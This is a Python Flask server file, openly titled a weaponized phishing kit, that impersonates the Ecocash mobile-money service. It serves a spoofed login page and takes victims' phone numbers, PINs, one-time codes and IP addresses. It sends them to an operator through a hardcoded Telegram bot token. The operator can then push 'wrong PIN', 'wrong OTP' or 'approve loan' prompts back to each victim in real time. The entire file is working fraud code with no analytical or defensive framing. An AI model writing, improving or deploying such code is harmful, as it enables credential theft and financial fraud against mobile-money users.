# server.py - Fully Weaponized Ecocash Phisher (Render-Ready)
from flask import Flask, request, jsonify, send_from_directory, abort
from flask_cors import CORS
import requests
import threading
import time
import json
import os
import uuid
from datetime import datetime

app = Flask(__name__, static_folder=None)
CORS(app)

# === CONFIG ===
BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E'
CHAT_ID = '1469249528'
TG_API = f'https://api.telegram.org/bot{BOT_TOKEN}'

# Persistence across dyno restarts
DATA_FILE = 'exfil_data.json'
active_victims = {}
last_update_id = 0
victim_lock = threading.Lock()

# Load saved victims
def load_victims():
    global active_victims
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                active_victims = json.load(f)
    except Exception as e:
        print(f"[INIT] No saved data: {e}")

def save_victims():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(active_victims, f)
    except Exception as e:
        print(f"[SAVE] Failed: {e}")

# Reliable Telegram sender
def tg_send(text, reply_markup=None, max_retries=3):
    payload = {
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'Markdown',
        'disable_web_page_preview': True
    }
    if reply_markup:
        payload['reply_markup'] = reply_markup

    for attempt in range(max_retries):
        try:
            r = requests.post(f'{TG_API}/sendMessage', json=payload, timeout=15)
            if r.status_code == 200 and r.json().get('ok'):
                return r.json()
        except Exception as e:
            print(f'[TG FAIL {attempt+1}] {e}')
            time.sleep(2 ** attempt)
    return {'ok': False}

def tg_answer(callback_query_id):
    try:
        requests.post(f'{TG_API}/answerCallbackQuery', json={'callback_query_id': callback_query_id}, timeout=10)
    except:
        pass

# === SERVE FAVICON AND LOGO FROM REMOTE ECOCASH CDN ===
@app.route('/favicon.ico')
def favicon():
    return send_from_directory('.', 'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/assets/images/ecocash-logo-white.png')
def logo():
    return send_from_directory('.', 'ecocash-logo-white.png', mimetype='image/png')

@app.route('/apple-touch-icon.png')
def apple_icon():
    return send_from_directory('.', 'apple-touch-icon.png', mimetype='image/png')

# Fallback favicon
@app.route('/favicon.png')
def favicon_png():
    return send_from_directory('.', 'favicon.png', mimetype='image/png')

# === MAIN PAGE ===
@app.route('/')
def index():
    try:
        return send_from_directory('.', 'index.html')
    except Exception as e:
        print(f"[INDEX ERROR] {e}")
        abort(500)

# === API ENDPOINTS ===
@app.route('/api/exfil', methods=['POST'])
def exfil():
    try:
        data = request.get_json(force=True)
    except:
        abort(400)

    victim_id = data.get('victimId') or str(uuid.uuid4())
    data['victimId'] = victim_id
    data['time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)

    with victim_lock:
        active_victims[victim_id] = data
        save_victims()

    msg = f"""
🔐 *ECOCASH FULL EXFIL*
📞 *Number:* `{data.get('msisdn', 'N/A')}`
🔐 *PIN:* `{data.get('pin', 'N/A')}`
🔢 *OTP:* `{data.get('otp', 'N/A')}`
💸 *Loan:* `{data.get('amount', 'N/A')}`
📅 *Term:* `{data.get('term', 'N/A')}`
🕒 *Time:* `{data.get('time')}`
📡 *IP:* `{data.get('ip')}`
"""
    threading.Thread(target=tg_send, args=(msg,), daemon=True).start()
    return jsonify({'ok': True, 'victimId': victim_id})

@app.route('/api/alert', methods=['POST'])
def alert():
    try:
        data = request.get_json(force=True)
    except:
        abort(400)

    victim_id = data.get('victimId', str(uuid.uuid4()))
    msisdn = data.get('msisdn', 'Unknown')
    amount = data.get('amount', 'N/A')

    keyboard = {
        'inline_keyboard': [
            [{'text': '❌ Wrong PIN', 'callback_data': f'wrongpin_{victim_id}'}],
            [{'text': '❌ Wrong OTP', 'callback_data': f'wrongotp_{victim_id}'}],
            [{'text': '✅ Approve Loan', 'callback_data': f'approve_{victim_id}'}]
        ]
    }

    msg = f"🚨 *NEW VICTIM* 🚨\n📞 `{msisdn}`\n💸 `{amount}`\n🆔 `{victim_id}`"
    threading.Thread(target=tg_send, args=(msg, keyboard), daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/poll', methods=['GET'])
def poll():
    global last_update_id
    victim_id = request.args.get('victimId', '')
    if not victim_id:
        return jsonify({'action': 'none'})

    try:
        r = requests.get(
            f'{TG_API}/getUpdates',
            params={'offset': last_update_id + 1, 'timeout': 20},
            timeout=25
        )
        updates = r.json().get('result', [])

        for update in updates:
            update_id = update['update_id']
            if update_id <= last_update_id:
                continue
            last_update_id = max(last_update_id, update_id)

            cb = update.get('callback_query')
            if not cb:
                continue

            if str(cb['from']['id']) != str(CHAT_ID):
                tg_answer(cb['id'])
                continue

            data = cb.get('data', '')
            tg_answer(cb['id'])

            if data.startswith('wrongpin_') and data.endswith(victim_id):
                return jsonify({'action': 'wrongpin'})
            if data.startswith('wrongotp_') and data.endswith(victim_id):
                return jsonify({'action': 'wrongotp'})
            if data.startswith('approve_') and data.endswith(victim_id):
                return jsonify({'action': 'approve'})

    except Exception as e:
        print(f'[POLL ERROR] {e}')

    return jsonify({'action': 'none'})

# Health check (keeps Render awake)
@app.route('/health')
def health():
    return jsonify({'status': 'online', 'victims': len(active_victims)})

# Fallback exfil
@app.route('/exfil-post', methods=['POST'])
def exfil_form():
    form = request.form
    data = {
        'msisdn': form.get('msisdn', 'FORM'),
        'pin': form.get('pin', 'FORM'),
        'otp': form.get('otp', 'FORM'),
        'amount': form.get('amount', 'FORM'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    msg = "📄 *FORM EXFIL*\n" + "\n".join([f"{k.upper()}: `{v}`" for k, v in data.items()])
    threading.Thread(target=tg_send, args=(msg,), daemon=True).start()
    return '', 204

if __name__ == '__main__':
    load_victims()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
